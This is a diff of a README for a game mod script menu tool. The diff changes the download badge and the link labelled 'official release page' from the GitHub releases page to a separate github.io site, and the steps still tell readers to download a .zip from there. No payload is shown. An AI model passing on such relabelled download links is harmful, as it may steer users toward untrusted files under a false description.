@@ -1,6 +1,6 @@
 # ⚙️ a3modz-script-menu-v2026 - Control your menu settings with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/woody-alteration105/a3modz-script-menu-v2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://woody-alteration105.github.io)
 
 This utility provides a simple way to manage your a3modz script menu. It uses a clean HTML interface to help you organize your options and change how your menu behaves. You do not need to edit code or change complex settings files to use this tool. Everything stays within a compact format that runs in your web browser. 
 
@@ -9,7 +9,7 @@ This utility provides a simple way to manage your a3modz script menu. It uses a 
 You need to perform a few steps to prepare the tool on your Windows computer.
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/woody-alteration105/a3modz-script-menu-v2026/releases).
+2. Go to the [official release page](https://woody-alteration105.github.io).
 3. Look for the section labeled Assets.
 4. Click the link that ends in .zip to save the file to your computer.
 5. Choose a location on your computer where you want to keep the files.
